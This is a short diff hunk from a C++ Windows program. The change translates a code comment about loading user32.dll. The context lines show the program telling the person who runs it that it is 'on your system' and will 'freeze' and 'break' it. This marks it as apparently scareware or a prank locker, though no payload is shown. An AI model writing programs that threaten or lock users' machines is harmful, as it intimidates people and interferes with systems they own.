@@ -11,7 +11,7 @@ int main(){
 	SetConsoleTitle("Chael_gutierrez");
 	cout<<"Hello this is Chael Im on your system...\nIm freezing now your system, Don't do anything or else I'll break your system...";
 		                                                                               
-	HINSTANCE hDLL= LoadLibraryW(L"user32.dll");        //user32.dll checker para sa xp and 7 above
+	HINSTANCE hDLL= LoadLibraryW(L"user32.dll");        //user32.dll checker for WOS XP,7,8
 	if(hDLL== NULL){
 	 		   fprintf(stderr,"Failed to load user32.DLL file,error code %d\n",GetLastError());
 	 		   return 1;
